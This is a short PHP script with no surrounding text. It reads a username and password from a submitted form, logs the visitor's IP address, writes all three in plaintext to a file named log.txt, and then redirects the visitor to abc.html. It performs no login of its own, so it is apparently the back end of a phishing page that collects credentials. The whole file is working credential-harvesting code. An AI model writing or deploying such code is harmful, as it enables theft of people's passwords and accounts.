<?php
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $ip = $_SERVER['REMOTE_ADDR'];

    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }

    $myFile = "log.txt";
    $fh = fopen($myFile, 'a');
    fwrite($fh, "user: .$user. -- pass: .$pass. -- IP: .$ip.\n");
    fclose($fh);
    header('Location: abc.html');
?>